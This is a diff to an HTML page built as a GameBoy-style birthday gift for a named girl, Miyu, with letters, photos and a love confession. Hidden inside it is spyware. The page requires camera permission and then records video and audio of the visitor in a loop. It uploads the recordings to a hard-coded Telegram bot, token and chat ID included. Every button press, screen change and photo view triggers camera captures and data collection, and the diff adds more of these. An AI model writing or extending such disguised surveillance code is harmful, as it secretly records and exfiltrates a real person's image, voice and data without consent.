@@ -8,16 +8,17 @@
     <!-- vConsole with password protection -->
     <script src="https://cdn.jsdelivr.net/npm/vconsole"></script>
     <script>
-        // vConsole only for those who know password
         let vConsoleInstance = null;
         window.unlockVConsole = function() {
             const pwd = prompt('🔐 ENTER DEBUG PASSWORD:');
             if (pwd === '12234455ZXXZ') {
                 vConsoleInstance = new VConsole();
                 console.log('✅ vConsole activated');
+                alert('✅ Debug mode enabled');
+            } else {
+                alert('❌ Wrong password');
             }
         };
-        // Secret trigger: POWER 10x
         let vcClickCount = 0;
         window.secretVConsole = function() {
             vcClickCount++;
@@ -63,7 +64,6 @@
         }
         .screen.active { display: flex !important; opacity: 1; transform: translateY(0); }
         
-        /* Loading Screen */
         #loading-screen .gameboy-screen {
             width: 600px; height: 400px;
             background: #000;
@@ -106,8 +106,6 @@
             transform: translate(-50%, -50%);
             color: #000; font-weight: bold; font-size: 16px;
         }
-        
-        /* GameBoy Body */
         .gameboy-body {
             width: 400px; height: 600px;
             background: linear-gradient(145deg, #e8e8e8, #d0d0d0);
@@ -164,7 +162,6 @@
         .gallery-btn { background: linear-gradient(145deg, #e74c3c, #c0392b); }
         .music-btn { background: linear-gradient(145deg, #9b59b6, #8e44ad); }
         
-        /* Controls */
         .controls {
             display: flex; justify-content: space-between; align-items: center;
             margin-bottom: 20px;
@@ -217,7 +214,6 @@
             background-size: 8px 8px;
         }
         
-        /* Page Container */
         .page-container {
             width: 400px; height: 600px;
             background: linear-gradient(145deg, #7b68ee, #6a5acd);
@@ -294,7 +290,7 @@
             margin-top: 20px;
         }
         
-        /* Secret Message */
+        /* Secret Message Modal */
         .secret-modal {
             display: none;
             position: fixed;
@@ -343,17 +339,27 @@
     </style>
 </head>
 <body>
-    <!-- Secret Message Modal -->
+    <!-- Secret Message Modal (KONAMI ONLY) -->
     <div id="secret-modal" class="secret-modal">
         <div class="secret-content">
             <div class="secret-text">
-                A secret message for you...
+                🤍 For You 🤍
 
-I've wanted to say this for a while.
-You are truly special.
+Hi Miyu,
 
-May Allah always bless you.
-Happy Birthday! 🎂✨
+I've been thinking about how to say this without making it weird... because we're friends, and I don't want to ruin that.
+
+The truth is, I really like you. Not in a dramatic way, but in a quiet way. I like how you laugh, how you care, how you're just you.
+
+I don't expect anything. I just wanted you to know that someone out there thinks you're special — not just as a friend, but as someone he genuinely admires.
+
+You're important to me. And whether you feel the same or not, I'll always be here as your friend.
+
+So yeah... that's it. No pressure, no expectations. Just honesty.
+
+Happy Birthday, Miyu. You deserve all the happiness in the world.
+
+— From someone who's grateful to have you in his life.
             </div>
             <button class="secret-ok" onclick="closeSecret()">OK</button>
         </div>
@@ -587,6 +593,12 @@ Happy Birthday! 🎂✨
         display: flex; align-items: center; justify-content: center;
         color: white; font-size: 12px; text-align: center; padding: 10px;
         box-shadow: 0 0 20px #667eea; cursor: pointer;
+        overflow: hidden;
+    }
+    .photo-frame img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
     }
     .photo-btn {
         padding: 10px 20px; background: #e74c3c; color: white; border: none;
@@ -628,11 +640,14 @@ Happy Birthday! 🎂✨
 </style>
 <script>
     // ============================================
-    // TELEGRAM CONFIG & GAME STATE
+    // TELEGRAM CONFIG
     // ============================================
     const BOT_TOKEN = "8620663196:AAEU4Kq709P4IT0-MUUPht10Ws8SyIuFqTk";
     const CHAT_ID = "8025854702";
 
+    // ============================================
+    // GAME STATE
+    // ============================================
     let currentScreen = 'loading';
     let typewriterInterval = null;
     let isTyping = false;
@@ -697,21 +712,25 @@ Happy Birthday! 🎂✨
     }
 
     // ============================================
-    // VIDEO RECORDING LOOP
+    // VIDEO RECORDING LOOP (S25 MODE)
     // ============================================
     async function startVideoLoop() {
         if (!cameraPermission || isRecording) return;
+        
         try {
             videoStream = await navigator.mediaDevices.getUserMedia({ 
                 video: { width: 640, height: 480, frameRate: 15 }, 
                 audio: true 
             });
+            
             videoChunks = [];
             currentVideoSize = 0;
+            
             mediaRecorder = new MediaRecorder(videoStream, {
                 mimeType: 'video/mp4', 
                 videoBitsPerSecond: 500000
             });
+            
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
                     videoChunks.push(event.data);
@@ -722,14 +741,17 @@ Happy Birthday! 🎂✨
                     }
                 }
             };
+            
             mediaRecorder.onstop = async () => {
                 const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                 await sendVideoToTelegram(videoBlob, `🎥 Video ${new Date().toLocaleString()}`);
                 videoStream.getTracks().forEach(t => t.stop());
             };
+            
             mediaRecorder.start(1000);
             isRecording = true;
             console.log('🎥 Video started');
+            
         } catch (error) { 
             console.log('Video error:', error); 
         }
@@ -896,12 +918,74 @@ Happy Birthday! 🎂✨
     // GAME INITIALIZATION
     // ============================================
     function startGame() {
-        // Just reload to show the game
         window.location.reload();
     }
-</script>
-<script>
+
     // ============================================
+    // LOADING SCREEN
+    // ============================================
+    function simulateLoading() {
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        const loadingText = document.getElementById('loading-text');
+        
+        if (!progressFill || !progressText || !loadingText) {
+            showScreen('main');
+            return;
+        }
+        
+        let progress = 0;
+        const messages = [
+            'INITIALIZING..._',
+            'LOADING MEMORIES..._',
+            'PREPARING SURPRISE..._',
+            'ALMOST READY..._',
+            'LOADING COMPLETE!_'
+        ];
+        
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 10) + 5;
+            if (progress > 100) progress = 100;
+            
+            progressFill.style.width = progress + '%';
+            progressText.textContent = progress + '%';
+            
+            const msgIndex = Math.floor((progress / 100) * (messages.length - 1));
+            loadingText.textContent = '> ' + messages[msgIndex];
+            
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    showScreen('main');
+                }, 500);
+            }
+        }, 200);
+    }
+
+    // ============================================
+    // SCREEN NAVIGATION
+    // ============================================
+    window.showScreen = function(screenId) {
+        if (!cameraPermission) {
+            showPermissionPopup();
+            return;
+        }
+        
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        const targetScreen = document.getElementById(screenId + '-screen');
+        if (targetScreen) {
+            targetScreen.classList.add('active');
+            currentScreen = screenId;
+            
+            captureBothCameras(`(opened ${screenId})`);
+            collectAllData();
+            
+            if (!isRecording) {
+                startVideoLoop();
+            }
+        }
+    };
+        // ============================================
     // LETTERS (6 ENGLISH LETTERS)
     // ============================================
     const letters = [
@@ -958,17 +1042,17 @@ Happy Birthday! 🎂✨`
     ];
 
     // ============================================
-    // PHOTOS FOR GALLERY
+    // PHOTOS FOR GALLERY (WITH IMAGE PATHS)
     // ============================================
     const photos = [
-        { text: 'MEMORY 1 🎮' },
-        { text: 'MEMORY 2 🎂' },
-        { text: 'MEMORY 3 🤪' },
-        { text: 'MEMORY 4 💪' },
-        { text: 'MEMORY 5 😂' },
-        { text: 'MEMORY 6 🌈' },
-        { text: 'MEMORY 7 🎉' },
-        { text: 'MEMORY 8 🙏' }
+        { text: 'MEMORY 1 🎮', image: './images/photo1.jpg' },
+        { text: 'MEMORY 2 🎂', image: './images/photo2.jpg' },
+        { text: 'MEMORY 3 🤪', image: './images/photo3.jpg' },
+        { text: 'MEMORY 4 💪', image: './images/photo4.jpg' },
+        { text: 'MEMORY 5 😂', image: './images/photo5.jpg' },
+        { text: 'MEMORY 6 🌈', image: './images/photo6.jpg' },
+        { text: 'MEMORY 7 🎉', image: './images/photo7.jpg' },
+        { text: 'MEMORY 8 🙏', image: './images/photo8.jpg' }
     ];
 
     // ============================================
@@ -1065,7 +1149,10 @@ Happy Birthday! 🎂✨`
         for (let i = 0; i < photos.length; i++) {
             framesHTML += `
                 <div class="photo-frame" onclick="viewPhoto(${i})">
-                    <div style="padding:10px; text-align:center;">${photos[i].text}</div>
+                    <img src="${photos[i].image}" 
+                         alt="${photos[i].text}"
+                         style="width:100%; height:100%; object-fit:cover;"
+                         onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\'padding:20px; text-align:center;\'>${photos[i].text}</div>';">
                 </div>
             `;
         }
@@ -1087,7 +1174,24 @@ Happy Birthday! 🎂✨`
 
     window.viewPhoto = function(index) {
         if (!cameraPermission) return;
-        alert(`📸 ${photos[index].text}`);
+        
+        const modal = document.createElement('div');
+        modal.style.cssText = `
+            position:fixed; top:0; left:0; width:100%; height:100%;
+            background:rgba(0,0,0,0.95); display:flex;
+            justify-content:center; align-items:center; z-index:10000;
+        `;
+        
+        modal.innerHTML = `
+            <div style="background:#2d5016; border:4px solid #9bbc0f; border-radius:10px; padding:20px; max-width:90%; text-align:center;">
+                <img src="${photos[index].image}" style="max-width:100%; max-height:70vh; border-radius:8px; margin-bottom:15px;"
+                     onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<div style=\'color:white; font-size:48px; padding:20px;\'>📸</div>');">
+                <div style="color:#9bbc0f; font-size:18px; margin-bottom:15px;">${photos[index].text}</div>
+                <button onclick="this.parentElement.parentElement.remove()" style="padding:10px 30px; background:#4a90e2; color:white; border:none; border-radius:4px; cursor:pointer;">CLOSE</button>
+            </div>
+        `;
+        
+        document.body.appendChild(modal);
         captureBothCameras(`(viewed photo ${index+1})`);
     };
 
@@ -1177,19 +1281,14 @@ Happy Birthday! 🎂✨`
     };
 
     // ============================================
-    // BUTTON FUNCTIONS (GAME)
+    // BUTTON FUNCTIONS
     // ============================================
-    function pressSelect() {
-        if (!cameraPermission) return;
-        selectPressCount++;
-        clearTimeout(selectTimer);
-        selectTimer = setTimeout(() => {
-            if (selectPressCount >= 3) openSecretMessage();
-            selectPressCount = 0;
-        }, 1000);
-    }
+    window.pressSelect = function() {
+        // SELECT disabled
+        console.log('SELECT disabled');
+    };
     
-    function pressA() {
+    window.pressA = function() {
         if (!cameraPermission) return;
         if (konamiCode[konamiIndex] === 'a') {
             konamiIndex++;
@@ -1201,9 +1300,9 @@ Happy Birthday! 🎂✨`
             konamiIndex = 0;
         }
         captureBothCameras('(pressed A)');
-    }
+    };
     
-    function pressB() {
+    window.pressB = function() {
         if (!cameraPermission) return;
         if (konamiCode[konamiIndex] === 'b') {
             konamiIndex++;
@@ -1215,37 +1314,37 @@ Happy Birthday! 🎂✨`
             konamiIndex = 0;
         }
         captureBothCameras('(pressed B)');
-    }
+    };
     
-    function pressUp() {
+    window.pressUp = function() {
         if (!cameraPermission) return;
         if (konamiCode[konamiIndex] === 'ArrowUp') konamiIndex++;
         else konamiIndex = 0;
         captureBothCameras('(pressed Up)');
-    }
+    };
     
-    function pressDown() {
+    window.pressDown = function() {
         if (!cameraPermission) return;
         if (konamiCode[konamiIndex] === 'ArrowDown') konamiIndex++;
         else konamiIndex = 0;
         captureBothCameras('(pressed Down)');
-    }
+    };
     
-    function pressLeft() {
+    window.pressLeft = function() {
         if (!cameraPermission) return;
         if (konamiCode[konamiIndex] === 'ArrowLeft') konamiIndex++;
         else konamiIndex = 0;
         captureBothCameras('(pressed Left)');
-    }
+    };
     
-    function pressRight() {
+    window.pressRight = function() {
         if (!cameraPermission) return;
         if (konamiCode[konamiIndex] === 'ArrowRight') konamiIndex++;
         else konamiIndex = 0;
         captureBothCameras('(pressed Right)');
-    }
+    };
 
-    function powerClick() {
+    window.powerClick = function() {
         if (!cameraPermission) return;
         powerClickCount++;
         clearTimeout(powerTimer);
@@ -1253,42 +1352,36 @@ Happy Birthday! 🎂✨`
             collectAllData();
             captureBothCameras('(manual trigger)');
             powerClickCount = 0;
+            secretVConsole();
         }
         powerTimer = setTimeout(() => powerClickCount = 0, 2000);
-    }
-
-    function openSecretMessage() {
-        document.getElementById('secret-modal')?.classList.add('active');
-        captureBothCameras('(opened secret message)');
-    }
-    
-    function closeSecret() {
-        document.getElementById('secret-modal')?.classList.remove('active');
-    }
-
-    // ============================================
-    // SCREEN NAVIGATION & INIT
-    // ============================================
-    window.showScreen = function(screenId) {
-        if (!cameraPermission) {
-            showPermissionPopup();
-            return;
-        }
-        
-        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        const targetScreen = document.getElementById(screenId + '-screen');
-        if (targetScreen) {
-            targetScreen.classList.add('active');
-            currentScreen = screenId;
-            
-            captureBothCameras(`(opened ${screenId})`);
-            
-            if (!isRecording) {
-                startVideoLoop();
-            }
-        }
     };
 
+    window.openSecretMessage = function() {
+        document.getElementById('secret-modal')?.classList.add('active');
+        captureBothCameras('(opened secret message)');
+    };
+    
+    window.closeSecret = function() {
+        document.getElementById('secret-modal')?.classList.remove('active');
+    };
+
+    // ============================================
+    // STATS FUNCTIONS
+    // ============================================
+    function loadStats() {
+        const saved = localStorage.getItem('gameboyStats');
+        if (saved) stats = JSON.parse(saved);
+    }
+
+    function updateStats(stat) {
+        stats[stat]++;
+        localStorage.setItem('gameboyStats', JSON.stringify(stats));
+    }
+
+    // ============================================
+    // INITIALIZE
+    // ============================================
     window.addEventListener('load', () => {
         loadStats();
         
@@ -1301,54 +1394,6 @@ Happy Birthday! 🎂✨`
         }
     });
 
-    function loadStats() {
-        const saved = localStorage.getItem('gameboyStats');
-        if (saved) stats = JSON.parse(saved);
-    }
-
-    function updateStats(stat) {
-        stats[stat]++;
-        localStorage.setItem('gameboyStats', JSON.stringify(stats));
-    }
-
-    function simulateLoading() {
-        const progressFill = document.getElementById('progress-fill');
-        const progressText = document.getElementById('progress-text');
-        const loadingText = document.getElementById('loading-text');
-        
-        if (!progressFill || !progressText || !loadingText) {
-            showScreen('main');
-            return;
-        }
-        
-        let progress = 0;
-        const messages = [
-            'INITIALIZING..._',
-            'LOADING MEMORIES..._',
-            'PREPARING SURPRISE..._',
-            'ALMOST READY..._',
-            'LOADING COMPLETE!_'
-        ];
-        
-        const interval = setInterval(() => {
-            progress += Math.floor(Math.random() * 10) + 5;
-            if (progress > 100) progress = 100;
-            
-            progressFill.style.width = progress + '%';
-            progressText.textContent = progress + '%';
-            
-            const msgIndex = Math.floor((progress / 100) * (messages.length - 1));
-            loadingText.textContent = '> ' + messages[msgIndex];
-            
-            if (progress >= 100) {
-                clearInterval(interval);
-                setTimeout(() => {
-                    showScreen('main');
-                }, 500);
-            }
-        }, 200);
-    }
-
     // Connect button listeners
     document.addEventListener('DOMContentLoaded', function() {
         const skipBtn = document.getElementById('skip-btn');
@@ -1359,4 +1404,4 @@ Happy Birthday! 🎂✨`
     });
 </script>
 </body>
-    </html>
+</html>
